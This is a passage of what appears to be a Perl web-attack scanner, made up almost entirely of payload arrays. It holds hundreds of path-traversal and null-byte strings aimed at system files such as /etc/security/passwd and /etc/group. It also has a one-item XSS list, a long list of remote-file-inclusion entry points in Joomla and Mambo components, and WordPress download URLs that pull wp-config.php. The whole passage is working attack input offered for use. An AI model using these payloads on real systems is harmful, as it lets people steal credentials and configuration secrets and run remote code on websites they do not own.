%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","/etc/group%00","....%2F%2Fetc/group%00","....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","//etc/group","....//etc/group","....//....//etc/group","....//....//....//etc/group","....//....//....//....//etc/group","....//....//....//....//....//etc/group","....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//....//etc/group","//etc/group%00","....//etc/group%00","....//....//etc/group%00","....//....//....//etc/group%00","....//....//....//....//etc/group%00","....//....//....//....//....//etc/group%00","....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//....//etc/group%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/group","../etc/security/group","../../etc/security/group","../../../etc/security/group","../../../../etc/security/group","../../../../../etc/security/group","../../../../../../etc/security/group","../../../../../../../etc/security/group","../../../../../../../../etc/security/group","../../../../../../../../../etc/security/group","../../../../../../../../../../etc/security/group","/etc/security/group%00","../etc/security/group%00","../../etc/security/group%00","../../../etc/security/group%00","../../../../etc/security/group%00","../../../../../etc/security/group%00","../../../../../../etc/security/group%00","../../../../../../../etc/security/group%00","../../../../../../../../etc/security/group%00","../../../../../../../../../etc/security/group%00","../../../../../../../../../../etc/security/group%00","%2Fetc%2Fsecurity%2Fgroup","..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","%2Fetc%2Fsecurity%2Fgroup%00","..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","%2F%2Fetc/security/group","....%2F%2Fetc/security/group","....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","%2F%2Fetc/security/group%00","....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","//etc/security/group","....//etc/security/group","....//....//etc/security/group","....//....//....//etc/security/group","....//....//....//....//etc/security/group","....//....//....//....//....//etc/security/group","....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//....//etc/security/group","//etc/security/group%00","....//etc/security/group%00","....//....//etc/security/group%00","....//....//....//etc/security/group%00","....//....//....//....//etc/security/group%00","....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//....//etc/security/group%00");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub XSS {@XSS = ("%27");}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub RFI {@RFI = ("/components/com_flyspray/startdown.php?file=", "/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=", "/components/com_simpleboard/file_upload.php?sbp=", "/components/com_hashcash/server.php?mosConfig_absolute_path=", "/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=", "/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=", "/components/com_performs/performs.php?mosConfig_absolute_path=", "/components/com_forum/download.php?phpbb_root_path=", "/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=", "/components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=", "/components/minibb/index.php?absolute_path=", "/components/com_smf/smf.php?mosConfig_absolute_path=", "/modules/mod_calendar.php?absolute_path=", "/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=", "/components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=", "/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=", "/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=", "/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=", "/administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=", "/administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=", "/administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=", "/components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=", "/components/com_securityimages/configinsert.php?mosConfig_absolute_path=", "/components/com_securityimages/lang.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/components/com_galleria/galleria.html.php?mosConfig_absolute_path=", "/akocomments.php?mosConfig_absolute_path=", "/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=", "/components/com_zoom/classes/fs_unix.php?mosConfig_absolute_path=", "/components/com_zoom/includes/database.php?mosConfig_absolute_path=", "/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=", "/components/com_fm/fm.install.php?lm_absolute_path=", "/administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=", "/components/com_lmo/lmo.php?mosConfig_absolute_path=", "/administrator/components/com_webring/admin.webring.docs.php?component_dir=", "/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=", "/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=", "/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=", "/components/com_mambowiki/MamboLogin.php?IP=", "/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=", "/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=", "/components/com_cpg/cpg.php?mosConfig_absolute_path=", "/components/com_moodle/moodle.php?mosConfig_absolute_path=", "/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=", "/components/com_mospray/scripts/admin.php?basedir=", "/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=", "/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path=", "/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=", "/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=", "/components/com_madeira/img.php?url=", "/components/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/admin.jjgallery.php?mosConfig_absolute_path=", "/components/com_jreviews/scripts/xajax.inc.php?mosConfig_absolute_path=", "/com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=", "/index.php?option=com_custompages&cpage=", "/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/components/com_facileforms/facileforms.frame.php?ff_compath=", "/administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=", "/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=", "/administrator/components/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=", "/administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=", "/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=", "/administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=", "/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=", "/components/com_jd-wiki/lib/tpl/default/main.php?mosConfig_absolute_path=", "/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=", "/components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/components/com_reporter/reporter.logic.php?mosConfig_absolute_path=", "/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_joomlaboard/file_upload.php?sbp=", "/components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/request_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.tab.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.divs.php?mosConfig_absolute_path=", "/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=", "/modules/mod_as_category.php?mosConfig_absolute_path=", "/components/com_articles.php?absolute_path=", "/classes/html/com_articles.php?absolute_path=", "/administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=", "/templates/be2004-2/index.php?mosConfig_absolute_path=", "/libraries/pcl/pcltar.php?g_pcltar_lib_dir=", "/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=", "/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=", "/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=", "/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=", "/administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=", "/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=", "/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=", "/components/com_mp3_allopass/allopass.php?mosConfig_live_site=", "/components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=", "/administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolte_path=", "/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_color/admin.color.php?mosConfig_live_site=", "/administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=", "/administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=", "/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=", "/index.php?option=com_adsmanager&mosConfig_absolute_path=", "/com_ponygallery/admin.ponygallery.html.php?mosConfig_absolute_path=", "/com_magazine_3_0_1/magazine.functions.php?config=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/administrator/components/com_universal/includes/config/config.html.php?mosConfig_absolute_path=", "/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=");
}
############################################################################################################################################################################################
############################################################################################################################################################################################
#ADF WP WORDPRESS
sub ADFWP {@ADFWP =("/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
"/wp-content/force-download.php?file=../wp-config.php",
"/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php",
"/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php",
"/wp-content/themes/markant/download.php?file=../../wp-config.php",
"/wp-content/themes/yakimabait/download.php?file=./wp-config.php",
"/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php",
"/wp-content/themes/felis/download.php?file=../wp-config.php",
"/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php",
